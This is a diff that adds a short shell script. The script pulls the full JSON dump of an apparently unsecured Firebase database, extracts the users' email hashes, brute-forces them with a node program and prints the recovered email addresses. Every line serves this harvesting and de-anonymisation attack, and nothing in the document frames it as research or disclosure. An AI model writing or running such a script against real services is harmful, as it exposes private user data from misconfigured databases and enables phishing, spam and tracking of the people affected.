@@ -1,0 +1,13 @@
+#!/bin/sh
+
+# public database
+curl https://slack-67fe0.firebaseio.com/.json | json_reformat  > osirisUsers.json
+
+# emailHashes
+grep emailHash osirisUsers.json | cut -d \" -f 4 > emailHashes
+
+# bruteforce search
+node email > crackedEmails
+
+# print results
+cat crackedEmails
